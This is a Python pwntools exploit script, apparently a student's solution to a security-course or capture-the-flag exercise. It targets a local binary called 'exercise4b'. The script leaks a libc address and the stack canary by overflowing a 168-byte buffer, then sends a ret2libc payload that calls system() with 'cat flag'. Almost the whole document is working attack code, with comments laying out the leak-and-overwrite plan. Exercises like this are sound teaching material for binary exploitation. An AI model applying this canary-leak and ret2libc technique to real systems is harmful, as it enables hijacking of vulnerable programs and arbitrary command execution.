#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise4/exercise4b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

'''
Issue: same as before bUT different calling conventions. What does this imply in practice?

Ideas: same as before:
	- Ghidra: canary, 3 variables of length 4 before cnary check => 12 padding
	- Buffer 168 bytes
	- GDB: found bytes sendline() necessary to leak addresses and the canary values
Workflow: 
	- send partial buffer as determined with GDB to leak addresses (fgets from libc, welcome())
	- calculatee offset with respect to it to be added to system and exxit addresses respectively (static offset with .symbols() as always)
	- overwrite the return address for jumping to the system function with 'cat flag' as argument
'''

BUFFER_SIZE = 168
LEAK_SIZE = 120 # from GDB
WELCOME_SIZE = 15 # from output as before 
FGETS_SIZE = 6	# from output in GDB
CANARY_SIZE = 4
FGETS_OFFSET = 154 # from GDB
CHECK_AUTH_RET_OFFSET = 138 # from GDB


elf = ELF('handout/exercise4/exercise4b')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

r = start()
r.recvline()
r.sendline(b'cat flag')
r.recvuntil(b'password:\n')
r.sendline(b'A'*(LEAK_SIZE-1))

response = r.recvuntil(b'password')

#print(response)

offset = (int.from_bytes(response[WELCOME_SIZE+LEAK_SIZE:WELCOME_SIZE+LEAK_SIZE+FGETS_SIZE], 'little') - FGETS_OFFSET) - libc.symbols['fgets']

r.recvuntil(b'password:\n')
r.sendline(b'A'*(BUFFER_SIZE-1))
response = r.recvuntil(b'password')

#print(response)

canary_values = response[BUFFER_SIZE+WELCOME_SIZE:BUFFER_SIZE+WELCOME_SIZE+CANARY_SIZE]

#print(canary_values)

system_address = libc.symbols['system'] + offset
exit_address = libc.symbols['exit'] + offset
check_auth_ret = elf.symbols['check_authorization'] + CHECK_AUTH_RET_OFFSET

payload = b'A'*BUFFER_SIZE + canary_values + b'A'*12 + p64(check_auth_ret) + p64(system_address) + p64(exit_address) + p64(elf.symbols['name'])

r.sendline(payload)

print(r.recvall())






















